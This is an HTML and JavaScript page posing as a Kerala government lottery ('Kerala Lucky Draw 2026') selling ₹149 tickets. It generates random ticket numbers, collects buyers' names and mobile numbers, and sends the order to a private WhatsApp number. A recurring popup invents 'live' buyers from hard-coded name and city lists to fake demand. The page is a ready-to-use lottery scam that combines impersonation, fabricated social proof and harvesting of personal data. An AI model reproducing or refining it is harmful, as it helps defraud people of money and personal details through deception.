<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Kerala Government Ticket</title>

<style>
body{
margin:0;
background:linear-gradient(135deg,#fff0f5,#ffe6f0);
font-family:Arial,sans-serif;
display:flex;
justify-content:center;
padding:10px;
}
.container{
width:100%;
max-width:400px;
background:#fff;
padding:16px;
border-radius:16px;
box-shadow:0 8px 20px rgba(0,0,0,.15);
}
.heroBox{
background:linear-gradient(135deg,#ff4f79,#ff758c);
color:#fff;
padding:14px;
border-radius:12px;
text-align:center;
margin-bottom:10px;
}
input,select,button{
width:100%;
padding:10px;
margin-bottom:8px;
border-radius:8px;
border:1px solid #ddd;
font-size:13px;
}
.ticketBox{
border:2px dashed #ff4f79;
border-radius:12px;
padding:10px;
background:#fff7fa;
}
.ticketAmount{
background:#e8f5e9;
color:#1b5e20;
padding:6px;
border-radius:8px;
text-align:center;
font-weight:bold;
margin-bottom:6px;
font-size:13px;
}
select[multiple]{height:90px;}
.tag{
display:inline-block;
padding:6px 10px;
border-radius:20px;
margin:4px 4px 0 0;
font-size:12px;
font-weight:bold;
position:relative;
}
.tag span{
margin-left:6px;
cursor:pointer;
color:red;
}
.paid{background:#ffd6e0;color:#c2185b;}
.free{background:#d0f0ff;color:#006064;}
button{
background:linear-gradient(90deg,#ff1744,#d50000);
color:#fff;
border:none;
font-weight:bold;
cursor:pointer;
font-size:15px;
padding:12px;
border-radius:10px;
}
button:disabled{opacity:.5;}

/* Live Popup */
#livePopup{
position:fixed;
bottom:80px;
left:10px;
right:10px;
max-width:330px;
margin:auto;
background:#fff;
padding:12px;
border-radius:12px;
box-shadow:0 0 20px rgba(0,0,0,0.3);
display:none;
font-size:13px;
z-index:9999;
}
#livePopup.show{
display:block;
animation:fadeIn .5s;
}
@keyframes fadeIn{
from{opacity:0;transform:translateY(30px);}
to{opacity:1;transform:translateY(0);}
}
.liveName{font-weight:bold;color:#0b6b3a;}
</style>
</head>

<body>
<div class="container">

<div class="heroBox">
<h2>🎉 Kerala Lucky Draw 2026</h2>
<p>🔥 Buy 2 Get 1 FREE Offer 🔥</p>
</div>

<input id="name" placeholder="Full Name">
<input id="mobile" placeholder="Mobile Number">

<div class="ticketBox">
<div class="ticketAmount" id="ticketAmount">
💰 Select tickets
</div>
<select id="ticket" multiple></select>
</div>

<div id="selectedTickets"></div>
<input id="amount" placeholder="Total Amount (₹)" readonly>
<button id="submitBtn" disabled>Submit & Continue</button>

</div>

<div id="livePopup">
<div id="liveText"></div>
</div>

<script>
const TICKET_PRICE=149;

const ticket=document.getElementById("ticket"),
amount=document.getElementById("amount"),
ticketAmount=document.getElementById("ticketAmount"),
submitBtn=document.getElementById("submitBtn"),
nameI=document.getElementById("name"),
mobileI=document.getElementById("mobile"),
selectedDiv=document.getElementById("selectedTickets");

let generatedFreeTickets=[];

for(let i=0;i<2000;i++){
 let n=("000000"+Math.floor(Math.random()*999999)).slice(-6);
 let o=document.createElement("option");
 o.value="KL"+n;
 o.textContent="KL"+n;
 ticket.appendChild(o);
}

function generateFreeTicket(){
 let n=("000000"+Math.floor(Math.random()*999999)).slice(-6);
 return "KL"+n;
}

function refresh(){
 let sel=[...ticket.selectedOptions];
 selectedDiv.innerHTML="";
 generatedFreeTickets=[];

 let paidTickets=sel.length;
 let freeCount=Math.floor(paidTickets/2);
 let totalAmount=paidTickets*TICKET_PRICE;
 let totalTickets=paidTickets+freeCount;

 if(paidTickets>=1){
   amount.value="₹ "+totalAmount;
   ticketAmount.textContent=
   "Paid: "+paidTickets+
   " | Free: "+freeCount+
   " | Total: "+totalTickets+
   " | Amount: ₹ "+totalAmount;
 }else{
   amount.value="";
   ticketAmount.textContent="💰 Select tickets";
 }

 // Paid tickets with remove option
 sel.forEach(option=>{
   let tag=document.createElement("div");
   tag.className="tag paid";
   tag.innerHTML="🎟 "+option.value+" (Paid) <span>✖</span>";
   tag.querySelector("span").onclick=()=>{
     option.selected=false;
     refresh();
   };
   selectedDiv.appendChild(tag);
 });

 // Free tickets
 for(let i=0;i<freeCount;i++){
   let freeTicket=generateFreeTicket();
   generatedFreeTickets.push(freeTicket);

   let tag=document.createElement("div");
   tag.className="tag free";
   tag.innerHTML="🎁 "+freeTicket+" (Free)";
   selectedDiv.appendChild(tag);
 }

 submitBtn.disabled = !(paidTickets>=1 && nameI.value.trim().length>0 && mobileI.value.trim().length>=10);
}

ticket.addEventListener("change",refresh);
nameI.addEventListener("input",refresh);
mobileI.addEventListener("input",function(){
 mobileI.value = mobileI.value.replace(/\D/g,'');
 refresh();
});

submitBtn.addEventListener("click",function(){

 let sel=[...ticket.selectedOptions];
 let paidTickets=sel.length;
 let freeCount=Math.floor(paidTickets/2);
 let totalTickets=paidTickets+freeCount;

 let paidList=sel.map(o=>o.value).join(", ");
 let freeList=generatedFreeTickets.join(", ");

 let msg=`New Booking
Name: ${nameI.value}
Mobile: ${mobileI.value}

Paid Tickets (${paidTickets}):
${paidList}

Free Tickets (${freeCount}):
${freeList}

Total Tickets: ${totalTickets}
Amount: ₹ ${paidTickets*TICKET_PRICE}`;

 window.open("https://wa.me/+918298558752?text="+encodeURIComponent(msg),"_blank");
});

/* LIVE BOOKING POPUP */

const liveNames=["Arjun","Karthik","Ramesh","Lakshmi","Anjali","Priya","Vijay","Naveen"];
const liveCities=["Bengaluru","Chennai","Hyderabad","Kochi","Mysuru","Madurai"];

function showLivePopup(){
 let name=liveNames[Math.floor(Math.random()*liveNames.length)];
 let city=liveCities[Math.floor(Math.random()*liveCities.length)];
 let paid=Math.floor(Math.random()*5)+1;
 let free=Math.floor(paid/2);
 let total=paid+free;

 document.getElementById("liveText").innerHTML=
 "<span class='liveName'>"+name+"</span> from "+city+
 " just booked "+total+" tickets 🎟🔥";

 let popup=document.getElementById("livePopup");
 popup.classList.add("show");
 setTimeout(()=>popup.classList.remove("show"),4000);
}

setTimeout(showLivePopup,1000);
setInterval(showLivePopup,2000);
</script>

</body>
</html>
